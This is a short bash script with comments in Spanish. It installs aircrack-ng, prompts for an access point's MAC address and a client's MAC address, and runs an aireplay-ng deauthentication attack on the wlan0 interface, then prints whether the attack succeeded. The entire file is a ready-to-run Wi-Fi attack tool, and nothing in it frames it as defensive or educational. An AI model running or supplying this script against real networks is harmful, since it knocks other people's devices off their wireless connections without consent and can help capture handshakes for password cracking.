#!/bin/bash

apt update -y
apt upgrade -y
apt-get install -y aircrack-ng

# Solicitar las direcciones MAC del AP y del cliente al usuario
read -p "Introduce la dirección MAC del punto de acceso (AP): " AP_MAC
read -p "Introduce la dirección MAC del cliente: " CLIENT_MAC

# Realizar el ataque de deautenticación
sudo aireplay-ng --deauth 1 -a $AP_MAC -c $CLIENT_MAC wlan0

# Verificar el código de salida del comando aireplay-ng
if [ $? -eq 0 ]; then
    echo "Ataque de deautenticación exitoso contra $CLIENT_MAC en el punto de acceso $AP_MAC."
else
    echo "Error durante el ataque de deautenticación."
fi
